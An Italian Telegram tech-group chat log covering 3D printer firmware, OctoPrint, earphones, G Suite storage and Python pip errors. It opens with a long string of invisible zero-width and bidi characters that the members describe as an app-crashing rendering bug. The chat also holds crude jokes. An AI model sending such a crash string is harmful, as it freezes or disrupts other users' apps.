     <⚫>  ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‎ ‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏ ‎don‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‏⁧ ereh-hcuot-t
E per quale dio funziona con ogni app
Perché non lo ho Cosa sono queste preferenze
non bug ma feature ù-ù
se tutto va bene avevano dei problemi e invece che nasconderli hanno deciso di farli diventare easteregg
Per adesso ho usato la Getting Start direttamente da Google


me lo stavo chiedendo anche io
I migliori auricolari sotto i 30€ su Amazon?
Xiaomi hybrid graphene
O boh 🤔
AirPods

Raga
Adesso vedo, grazie
Ho un circuito in cui 1y e 2y sono cortocircuitati insieme ma gli ingressi no... Che senso ha?
È un bug nelle librerie android in realtà li ci sarebbero tipo 5.600 caratteri che non riesce caricare
Xiaomi Mi QTER01JY originale pistone ferro ibrido cuffia auricolare auricolari in-ear telecomando e microfono, argento 
Xiaomi Original Hybrid Dual Driver In-Ear Auricolari per Android 
Quali di queste? 
Che cos'è kworker
????
Che belli i dischi virtuali
Come hai fatto?
queste sono piu fighe
Cosa è circuito con un 1 entrata e due uscite
Io voglio sapere quelle che funzionano meglio!
quelle li, sono dual driver
Io ho Windows Mac non so come si fa
Dimmi su windows
Grazie
Qui
Ecco
 ho trovato l'antenna giusta
Ora si trasmette
che scuola fai?
Se solo non piovesse a schifo
Cosa cambia da un disco fisico?
Niente sole che ogni volta se installi un gioco li sopra devo ricordarti la lettera
Poi non so se c'è un metodo per metterla definitiva
Trattore Vicentino is the new Macchina Gialla
Quella sulla cima del palo? Non va bene. Quel palo è troppo sottile e di sicuro si flette e poi quell'antenna è per la tv analogica che lavora sugli 800MHz circa
Già..peeeerfetta ù-ù
R3000 Landini is the new macchina gialla
No dai, voglio solo testarla per vedere quanto male va
2 entrate e due uscite
Ma ho risolto
Colpa della prospettiva 
Il pin sopra sembrava intero mente invece era tagliato 
serio?
yep
Come faccio ad averlo?
non tutte lo fanno, se lo fanno te lo dicono subito
Ah ok
sei alle superiori?
purtroppo sì
ecco, avete una mail d'istituto?
No ma era fatto male si ora riguardandolo meglio e come dici tu
tipo 
non abbiamo un cazzo
bene  la vedo dura allora
infatti
sotto questo aspetto è una scuola di merda
oh, è in live the coding train
ciaooo
arrivo istant
anche se sono in 4G
Io ho 
e la mail é una mail di google?
dico, se entri nella casella di posta, è gmail?
Si
G suite
ok, dovresti avere anche il piano GDrive illimitato
Quello no
Ho 1TB
ah beh 
Forse prendo quello illimitato 🤔
Con l’account della scuola lo abbiamo illimitato
Anche quello dell’Università di mia sorella è illimitato
eh ecco
quello intendevo
Tu lo hai?
yup
Anche la g suite dell’azienda di mio padre ha giga illimitati
Fin ora hanno occupato 15TB di fatture, progetti, preventivi, backup
Ci sono anch'io su coding training
Train

io l'ho chiusa, tra poco scendo dalla corriera
Corriera?
Sei in viaggio?
da stammatina ho fatto solamente 5 pagine, domani scriverò le barzellette
appena tornato da scuola
Ma fino alle 16:00 sei a scuola?
Non è niente
16:45, di venerdì
Io 27 pagine ho studiato e ho preso 7
Ma come noi fino alle 16:20...
Ma voi fate geografia?
in quanto tempo?
beato te
io non riesco
scienze della terra... solo in prima
Ah ok
ma da quanto tempo non ti sento 
sei resuscitato dalla Turso?
Un informazione..... conoscete Corsi di programmazione in C++ accreditati con rilascio di certificazione?
nope
ITIS
Porca itis
Beh non cambia
Alcune scuole decidono di farlo ed altre no

Sono un altra categoria di misure
Si beh winzoz come qnche spesso un po' tutti gli os ragionano in GiB ecc.. solo che poi windows facendo la bastarda scrive GB, ma alla fine la differenza sta nel 1 GiB = 1024 MiB e 1GB = 1000MB
si, infatti intendevo medie/superiori/università
Potevano scontare un 2,5 sbatta✖️✖️
Ma in teoria windows anche se su esplora risorse scrive KB, MB, GB e TB in realtà calcola e ragiona in KiB, MiB, GiB, TiB
Sto creando un aiutante in matematica e italiano in c++ ma mi da rmeerore la libreria ifstream
Niente risolto
Siamo seri?

 ‎€1‎9.‎00‎ i‎nv‎ec‎e ‎ch‎e ‎€5‎7.‎65
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 6‎7.‎04%
⭐️‎ 4‎.5‎0 ‌‎/‌‎ ‎5.‎00‎ (‎3 ‎re‎ce‎ns‎io‎ni)
 

20€ 1TB?
perchè?
È pochissimo
e si
Il negozio è aperto da parecchio e ha 99% feedback positivi: non sembra una truffa
Bah
Pigghia non ti lamentare
 cambia bot, non sa contare le recensioni
e ma wikipedia ha dei spiegazioni di termini di programmazione?? non lo sapevo
anche i dev hanno una vita sociale eh
Wtf
cosa sarebbe?
Qualcuno se ne intende di bot ? ^^
Francesco dovrebbe creare un file di testo ma non li f a
ah
prosciutto
Prostata
Sono in sconto ste cose fighissime
Questo è uguale a quello sopra
Io
Linguaggio?
Ho fatto del bot in Python
Era tanto tempo fa
Come la scuola si decide a darli la mia carta di credito
raga nel visual studio dove devo mettere il header file per poterlo usare?
?
ho fatto un header file,ma non riesco a capire in che cartella mettere per riuscire ad usarlo con 
non trova il file semplicamente

?
?
?
^
mettilo dentro il progetto e poi fai  
 "nome.h"
Io carissimo Marco mi ha bloccato 
ma ho messo in tutti i posti possibili non lo trova e basta :(
ah ma il fatto che come default ho dev cpp cambia qualcosa?
A cosa servono gli header in c++? Sono ancora un novizio in quel linguaggio
beh puoi tenere dei classi(es.) li,cosi se fai 
 "header.h" puoi usare quello che ce dentro,velocizza e semplicizza il lavoro
Sono Patreon
Allora c’è un errore
No, dice che invio troppi messaggi
Non posso dire cosa ho fatto perchè mi banna anche da qui
ecco
e? se gli scrivi in privato é il minimo che puó fare 
ah niente, sei Patreon
Eh ha anche ragione...
rcaputt@na hanno finito gli HDD e il prezzo si è alzato
Non è necessaria una censura così estrema, siamo tutti adulti e vaccinati cazzo
si triggera il bot
 è vero che ti triggeri se dico parolacce?
ah grandissimo 
Spamma solo nei log
Ma pace
a parte quando scrive Marco (Realacci)

Sicuramente se parlo alla mano non mi risponde
 ciao bella bionda

Ma è automatico?
🤷‍♂
non penso un'intelligenza artificiale possa arrivare a questo punto
Ah, scusami
 quindi sei mora?
dai basta che poi Marco ci ammazza
 hai da dirci qualcosa?? Richieste Post?? 🤔
Shh
naah, semplice comando
ah allora sono l'unico minchione che fa ancora le post con le api per far parlare i bot
FAntastic
Ahahaah
No sono comandi per far parlare la mano della giustizia (integrati in grouphelpbot) e in quella dei referral (Easter egg del sottoscritto)
mi ero rotto le scatole
allora ho fatto un programma per creare le richieste post in automatico
Nono c'è python dietro
Cioè, c'è lo script python che fa cose
eh si lo so
ma dato che sono capace a programmare solo in VB NET le dannate richieste sono complicate da fare
Già
Anche se oddio... Non c'è nessun framework per fare bot telegram in 
?
finora non ne ho visto nessuno
ho sempre fatto tutto a mano
poor man
Ciao, ho disegnato questo fantastico apri bottiglia slava stalin. Se lo volete stampare o anche solo mettere mi piace 



funziona. a forma di falce e martello
lo stampo solo per questo
e metto like
 fissa
assolutamenteeee
E' un meme vivente
I can't
non ho poteri di fissare
Kryptonite is coming
Strano ma vero...
, potrebbe esse un bel nome per una Cryptovaluta
bene, quest'estate ci becchiamo? 
Ma.secondome un nome originale per una cryptovaluta potrebbe essere bireuro
Sis
ma 
Nuovo tipo di file .secondome
o keplercoin 
 
COME CAZZ FAI A SAP- ah vero
un file che mostra ogni volta un contenuto diverso in base all'utente che lo apre
eh
Quando hai montato più PC tu ,per i tuoi amici, che blink
blink non penso si possa fisicamente superare
Lo so...
Però 5 PC...rispetto
 
 
 
 ALLARME ROSSO
ma hahahahaha mi hai fatto prendere un colpo
è definitivamente scemo
È difficile sviluppare un app per il Deep learning con dei Framework?
Buonasera
Le porco il benvenuto nel gruppo di Marco Romboli, alias Overvolt. Le auguro buona permanenza
eeh che presentazione

Volevo fare una cosa decente
Ma ahahahah
Deep Learning mai toccato, ma prima bisogna avere nozioni basi per capire come funzionano le varie librerie (pesi, bias, layers, ecc...)
Ehilà. Benvenut*, compili il seguente questionario per superare il test d'ingresso e namaste.

.:Questionario:.
1. Quando è nat*?
2. È una ragazza o un ragazzo?
3. Install Gentoo.
4. Install Windows.
5. Lo gradisce un Linux Mint?
6. Lo gradisce un Pomodoro?
7. Si ritrova nella seguente affermazione: "Viva Satana"?  Motivare la risposta.
8. Si ritrova nella seguente affermazione: "Viva Windows"?  Motivare la risposta.
9. È a conoscenza delle teorie del maestro 
? Argomentare al riguardo.
10. Come si chiama il suo criceto?
11. Lei è scopabile?
12. PIN delle sue carte?
13. Nome e cognome.
14. Cittadinanza, domicilio e residenza.
15. Nome del nonno materno.
16. Colore del manto del proprio gatto.
17. È blue?
18. Cosa ne pensa di Arch?
19. Cosa ne pensa di KDE?
20. Cosa ne pensa di Kali?
21. Stallman è bello?
22. Chi era nella sua vita passata e come mai si presenta con queste nuove vesti?
By ignuranza
Lo strike di cromosomi colpisce tutti prima o poi
NON TOCCARMI IGNURANZA
Sai vero che va avanti così già da un bel po' tipo
LOOOL 
Oddio lo conoscevo sto gruppo, sono stato bannato perché dicevo cose strane del tipo: la terra non è piatta e non viviamo in matrix
La sofferenza
Mi date il link?
Non lo abbiamo
Come
Io voglio entrare e non posso?
Che si vada a fottere mongobaiter
Io ho la mail della scuola che finisce con .gov.it e sono riuscito a fare google drive file stream ma secondo voi questa mail con il relativo account si chiude quando finisco la scuola oppure resterà per sempre?? Perché sennò si perderebbero tutti i dati
Grazie
Ti dico solo che si chiama anomalia spaziale
Buongiorno mona
Tutti i
La verifica è andata
Bene o male?
Bene e male
Oggi che arrivo a casa mando la foto Delle domande e Delle risposte
Ok 
Su 7 domande ne ho fatte 3 o 4
La Magna Grecia e negli argomenti non c'era
3x100:7=4,2
Se le ho fatte bene
4x100:7=5,7

Dai che è 6

Ho fatto un video mentre inquadravo domande e verifica, oggi catturo il frame e giro in privato se ti interessa
Ok 
Verifica su cosa?
Up
G suite. Io l’ho
Sei in.... (classe)
Yes
Quale classe?
1 superiore ramo elettronica/elettrotecnica
Ok 
Quando devo fare li impianti mi metto a parlare dei Fenici...
Io sto studiando la seconda guerra mondiale in terza
A che serve studiarli
Quando vai a lavorare mentre lavori la racconti al cliente
Infatti
Odio studiare 
-religione
-musica
-storia (nella vita servono solo gli eventi importanti)
-Geografia(solo posizione degli Stati principali)
Quoto
Che mi interessa dell'Africa, del Marocco ecc.
Del Burundi
O dell’uguguay e del paraguay
🤦‍♂️
Comunque io Lunedì ho una verifica di storia sulla 2nd guerra mondiale
Idee di magliette scientifiche divertenti?
Ne sto cercando disperatamente anche io
E che non costino una fortuna
Mi basterebbe l’idea
Poi su Spreadshirt le fai personalizzate a poco
Aah da fare... Pensavo da comprare già fatta
Boh io ne volevo una con le equazioni di Maxwell e la solita scritta and then was light...
Tipo questa
PASHTET.....For real man
Si l’ho vista e mi piace un sacco
Ma è per un’amica e questa ce l’ha già  cercavo qualcosa di simile
Allora tipo quella con "May dp/dt be with you"? Scritto coi caratteri di star wars
Mai vista, sembra figa
Anche questa non è male
Così tipo
Oppure con la lagrangiana del modello standard o con qualche diagramma di Feynman....
Sulle altre scienze non ti so dire
Mi sa che prendo quella di star wars grazie mille
Ora te ne invio una oi
Cazzoe' la cattività babilonese?? 

Mai fatta quando ero a scuola.. 
Manco io
Esilio degli Ebrei a Babilonia sotto Nabucodonosor..dai ragazzi sono le basi queste

Me lo ricordo dalle elementari solo per il nome impronunciabile 
My gosh
Prova a mettere lo stesso UserAgent e gli stessi header
Figurati :)
Se stai usando BurpSuite o i tool di chrome puoi copiare direttamente la richiesta come comando curl
Allora puoi fare da burp suite, basta che setti il proxy nelle impostazioni di Firefox e importi il certificato
Qualcuno esperto di Android studio, che ho un dubbio. Grazie
È possibile che con Ubuntu non mi pesi spegnere e riaccendere il pc?
Eh, a me pesa comunque
Però almeno non quanto farlo con windows
È molto più veloce
Perché con Windows hai sempre il terrore degli aggiornamenti
Nemmeno
Ragazzi come si fa su Windows 10 a connettersi al router con il segnale 2.4 GHz piuttosto che con il 5 GHz ?
Devono essere separati
I due wi-fi
Tipo io ho TIM-xxxxxx-5ghz e TIM-xxxxxx-2.4ghz
Da me non è così 🤔
devi impostarlo dal programma del router
Anche io ho un modem tim
Devi impostarli
hey gente, domandina, dite che è una cosa utile cambiare il software dell'anet a8?
Se va bene no
Nel senso che stampa bene
mhh...volevo provare a mettergli octoprint comunque, facendo con il rasp
serve una fotocamera per octoprint?
Si
(Non so se è obbligatoria)
Comunque si può collegare
no perchè tipo pensavo ad usare quella che usasti per il microscopio, basta reinvertire le lenti
ma a che serve la fotocamera? solo per vederci o anche per livellare o per sistemi di controllo?
15 pagine
Ma sei serio? 
Per vedere la stampa
Intendi il firmware?
allora dopo ci penso io a farlo andare con l'altra fotocamera...e non è manco obligatorio, perfect
si pensavo a skynet 3d
Puoi anche non metterla
si lo so ma ci sta ù-ù
Però va a finire che si sfanculizza la stampa
cos
why?
Boh devi provare, al massimo tieni il backup
Sempre se si può fare
si beh il software stock di anet a8 c'è anche nella cartella di skynet 3d che di solito trovi su internet, e molti lo fanno
No dico... Va a finire che sfasa la stampa e non te ne accorgi senza videocamera
però volevo sapere se c'è un vero vantaggio nel farlo
Ecco appunto
a se succede dici, beh ma non mi è mai successo quindi
Devi leggere su guggol
già cercato, ma non trovo molto
Si
Fortunato :<

Un mio amico mi ha dato un rimasuglio di filamento riciclato, l'ho lasciato a stampare la notte ed ho trovato la torre Eiffel
Ok perfetto grazie
Ma a quale scopo vorresti cambiarlo?
nn c'ho un cazz da fare
A
K
Vedere in live la stampa da quello che so
apposct
Io ti consiglio di mettere Marlin
Why?
Cos'ha di meglio?
Il raspi te lo tieni per altre cose così e poi hai tutte le regolazioni possibili immaginabili
si ma cosa centra
voglio solo un buon motivo per mettere marlin
Ah ok
che poi...posso mettere sia marlin che octoprint eh
Io ti dico.. con marlin ho risolto diversi problemi che con il fw della cr 10 mini non riuscivo a risolvere, poi ho aggiunto il sensore capacitivo per il livellamento automatico, usando il fw th3d basato su Marlin
Poi in realtà stampi bene anche con il fw nativo
a beh, io ora come ora non ho alcun problema...beh quando metterò l'autolivellamento mi metterò anche marlin allora, per ora non mi serve quindi
tanto mi sono già abituato a questo per ora
Se non hai problemi tieniti quello... Piuttosto prendi o costruisci un frame più stabile di quello originale
Gli stepp/mm puoi già regolarli?
vut
in che senso stepp/mm
Regolare quanti stepp deve fare il motore per 1 mm di spostamento
non so manco cosa sia uno stepp io
Si
I motori stepper funzionano a step
7 pagine e mezzo al giorno

E sei disperato
si ok scontato
ma io ne studio tipo 40 il giorno prima di solito, e senza problemi
Ecco, in base alla dimensione della ruota che fa scorrere le cinghie gli stepp/mm variano
Ah
E hai una stampante
Come l'anet a8 che ha bisogno di un sacco di supporto
E solitamente non sono perfetti di fabbrica, quindi hai dimensioni imperfette
In realtà basta cambiare frame, poi stampa bene
chi è che ha detto che ha bisogno di "un sacco di supporto", basta livellarla, mettere a stampare e stampa, è abs == facilissimo da stampare, poracci
pff, la mia è perfetta ù-ù
mai dato problemi, mai li darà
Spectre Next Generation: il 2018 senza pace di Intel 


uaaaauuu
yee, rpi3, scelgo te
Non ci riesco
Ma ahahahah
Skynet è morto ormai... Nell'ultima release di Marlin hanno incluso board e LCD anet
Inoltre la board Anet ha un 1280 quindi non puoi farci granché...
nel tempo che hai fatto sto promemoria ne studiavi 15
ma sono 15 pagine lol
marlin normale no è? o anche il t3hd...
ho una anet a8, non ho mai pensato a cambiare firmware, che cazz ne so io
almeno il marlin ha le protezioni dentro contro i run away XD
Lo faccio sempre
E se fai i calcoli saranno 20 pagine circa
Secondo voi mi conviene mettere ubuntu 18.04 lts su un Acer Aspire d 255?
Io lo ho messo in dual boot con win10 sul mio pc
Ma il PC in questione ha 1 gb di ram e 255 gb di hdd...
Non saprei se gira
Più che altro perché non ha le caratteristiche consigliate
Qualche consiglio?
1gb di ram, meno di un telefono. La ram è sempre piena?
No
Che cosa bella
btw, io ho omni3d come firmware da quel che vedo, non skynet o marlin ora come ora
Hai un marlim vecchissimo, castratissimo e fatto male
peeerò funziona da dio
Brucia da fio
a già, ecco cos'era, su octoprinter mi era uscito un avvertimento di quelli scritti con il sangue in grassetto "la tua stampante ha un firmware obsoleto e tra i più pericolosi e a rischio ignizione"...ho premuto ignora :DDD
Ignori che la stampante IGNORA che quando sta andando fuori controllo (run away) non fa niente... Fantastico
:DD
senti inviami direttamente un firmware buono che glielo monto
Non ha il bootloader
bella
Se controlli con un calibro le dimensioni di un oggetto noterai che sono sbagliate (di pochissimo)
Devi metteglielo con arduino
(Per la prima volta utilizzi quei connettori isp che sennò sono inutili xD)
no ma in teoria anche da pc si può fare, via usb
vedo che in molti fanno così
Se non ha il bootloader no
È come quando compri un atmega nuovo, ci va caricato
ma da cura, mi da l'opzione
Te dico di no xD

vabb, fuori si è messo a piovere, al massimo l'incendio non durerà molto dai
Bastano 6 jumper è
si maaa, il bootloader dell'arduino mi si è sfottuto
sono riuscito a resuscitarlo con il rasp
ora riesco a compilare solo dal rasp, e ho paura...ma tanta
Anzi no basta una usb sulla anet, lo ha già un bootloader ahahha
perchè tipo 1 volta compila bene e un'altra no
ecco, povaro
ora installo tutto
Allora vuol dire caricare uno sketch come se fosse un normalissimo Arduino
sattohhh
si fa così in teoria
Ma però ti devi farr le calibrazioni
Hai un calibr
?
no
._.
Compra un calibro cinese 
no beh ne ho uno ma da mia nonna, fuori sta diluviando, mia mamma sta per prendermi per i capelli perchè devo andare tra poco
Ti ci vuole una mattinata a mettere il fw e calibrartela bene
in che senso calibrare, cosa c'è da calibrare?
  scelgo te
I calibri vanno calibrati
Beh ovvio

Le piante vanno bagnate
Ma per calibrare dei calibri, si calibrano altri calibri che calibrano i calibri?
Ehm si
Eh?
Makkos
Vi piace...
E arduino
Bello
Questo è il mio

Si calibrano step/mm di estrusore, assi x, y, z, flusso, retrazioni e accelerazioni
hey, con marlin, facendo home è normale che si fermino sugli end e non su 0 0 0?
Magari non l'hai settata alla posizione di home
Si si
O meglio... 0 0 0 è il punto in cui si ferma... A te dove rimane?
gli endstop staranno a degli offset negativi nel suo fw, vuol dire che lo 0,0 è l'inizio del piatto...
Raga perché non mi avete detto che su kicstart si deve essere maggiorenni
beh mi sembra ovvio, ricevi soldi, devi essere maggiorenne
Something seems off here



by 

.
.
Ah ma niente di grave
si no ho il piatto che inizia a 0 0 0 e lui si imposta su Z=0 mentre X e Y li tiene sugli end che stanno a X=-33 e Y=-10 perchè giustamente il piatto inizia poco dopo, ma dovrebbe essere anche giusta come cosa, se me lo segna vuol dire che lo sa, visto anche con un po' di tentativi di avvicinamento che al bordo del piatto è esattamente 0 0 0 quindi dovremmo esserci
mo' magno e poi faccio un tentativo di stampa, vi dirò
Raga ciao
 come e venuta sta stampa
Per la cinghia
Accetto consigli
seembra buona ma il filo non è un po' grosso? che filo usi?
e l'ugello da quanto è? giusto per capirci
perchè sembra grosso davvero
O,4 ugello settato 0,2 filo pla
mmhh...boh sembra grosso, comunque venuto bene, solo vedo che ogni tanto nei buchi finisce del filo, hai la retroazione?
Si mi sembra 60
che stampante hai?
Anet a8
ecco, io l'ho disabilito, è buggato su cura, poi vedi te, al massimo prova a disabilitarlo, pure a me succedeva che si facevano su i filetti così
quella che ti monti tu?
già
Si
e non ha dato problemi?
Nò
quanto l'hai pagata?
90 euri con codice
woow
da dove?
comunque, dite che caccia un altro hdd?
Chi?
ma seriamente con marlin non si può mandare in home finchè sta riscaldando per la stampa? -.- che tristezza
?
uuu stampa che è una bellezza
Mi consigliate un drone sotto i 500€ non da assemblare
racing o ripresa
Ripresa
xiaomi
Altre scelte??
Dove lo hai preso?
L’ha fatto lui con Arduino
e non è un kit??
Non lo so quello
forse, boh
non che sia difficile farlo senza se per quello
Infatti
Xiaomi Mi Drone 4K
Salve
Da acquistarsi col referral di overVolt come tutto 
Salve salve
 sti referral

hey gente qualcuno ha mai provato octoprint sul rasp?
Yup
HOMEMADE
a me esce una cosa abbastanza strana, tipo quando imposto le cartelle dove si trova cura_engine e la cartella dei timelapse mi dice "errore cartella non esistente" e quindi non so come mettere il percorso
te come hai fatto?
anche perchè ho provato un bel po' di percorsi ma continua a darmi sto errore fastidioso
Nope, ho preso un HC-204 un L298 e un arduino nano, più due motori su bangood
Salve e scusate l'ignoranza, che significa alla ram 4000 in o.c cosa cambia tra le normali?
A ecco...
Non contando i pezzi che poi non ho utilizzato (sono un po' ignorante e seguendo sketch in giro ho trovao molti errori) alla fine ho speso 6/7€
Lo chassis proviene da un vecchio regalo della mia ex
io questo l'ho pagato 60 euro circa... ma c'e' di meglio
Cos'ha dentro
sto facendo delle prove per farlo girare... funziona un pò come un carro armato
e c'e' un po di roba
Tipo?
questa e tutta l'elettronica
Figo... La mia intenzione era quella di upgradarlo man mano
Volevo metterci anch'io un IR sensor per il telecomandino
E mettere un servo per l'HC-204, boh vedrò
Raga
Mi serve uno bravo in elettronica che mi spieghi come mai una porta not se gli mando il segnale dei ricevitori degli encoder mi tiene la tensione di uscita sempre a 5v anche se il segnale in entrata cambia
oddio sistemato tutto, era perchè avevo cartelle e file in /root/ e lui non poteva accedere 🤦‍♂️
Something seems off here



by 
HAHHA
I’m cancer 
I too
è semplicemente geniale
Lo so :(
Chi mi da una mano? Se provo a utilizzare PIP in qualunque modo (Python 3.5) mi ritorna questo errore
Che comando dai?
pip3.5, pip3, pip, tutti ritornano la stessa cosa
Eh ma che comando dai?
Perché se fai pip e basta...
pip3.5 install [libreria]
Non funziona neanche pip freeze
Magari quella libreria non va con python 3.5
Installa python-apt
sudo apt-get install python-apt
Emanuele ma nell'immagine compare python 3.6... è la stessa cosa con python 3.5?
Sì, e con tutti gli altri
Perfetto, ora afferma che manca GDBM
Che errore esattamente dà?
Ah, e non posso neanche creare venv
Stessa tipologia di errori
Beh installa python3-gdbm
Nulla, non ne vo' sapè
Ancora errori?
Sì
Anche se i pacchetti sono aggiornati, è come se mancassero componenti
Una vocina nella mia testa mi sta dicendo di formattare e reinstallare Ubuntu da zero
scommetto che un'altra ti sta dicendo di comprare un cappio
Qualcuno che può aiutarmi ad utilizzare UNetbootin?
Usa Rufus
